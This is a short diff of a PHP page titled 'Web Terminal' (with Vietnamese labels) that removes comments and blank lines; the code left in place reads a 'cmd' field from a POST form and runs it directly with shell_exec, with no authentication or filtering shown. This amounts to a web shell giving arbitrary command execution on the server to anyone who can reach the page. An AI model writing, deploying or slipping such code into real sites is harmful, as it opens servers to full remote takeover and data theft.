@@ -1,10 +1,6 @@
 <?php
-// Kiểm tra xem đã nhận dữ liệu từ form hay chưa
 if (isset($_POST['cmd'])) {
-    // Lấy câu lệnh từ biến input
     $cmd = $_POST['cmd'];
-    
-    // Thực thi câu lệnh và lấy kết quả đầu ra
     $output = shell_exec($cmd);
 }
 ?>
@@ -16,7 +12,6 @@ if (isset($_POST['cmd'])) {
 </head>
 <body>
     <h1>Web Terminal</h1>
-
     <form method="post" action="">
         <label for="cmd">Nhập câu lệnh:</label>
         <input type="text" name="cmd" id="cmd">
